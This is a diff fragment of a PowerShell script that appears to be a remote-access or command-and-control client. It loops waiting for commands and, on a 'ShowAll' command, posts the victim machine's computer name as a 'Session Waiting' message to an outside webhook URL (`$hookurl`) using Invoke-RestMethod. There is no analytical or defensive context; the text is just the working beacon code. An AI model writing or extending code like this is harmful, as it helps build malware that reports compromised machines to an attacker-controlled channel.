@@ -1268,7 +1268,9 @@ while($true){
         Write-Output "Command found!"
         if($authenticated -ne 1){
             if ($response -like "ShowAll") {
-		WaitingMsg
+	    	$previouscmd = $response   
+    		$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "``````Session Waiting : $env:COMPUTERNAME``````"} | ConvertTo-Json
+    		Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
      	    }
      	}
         if($authenticated -eq 1){
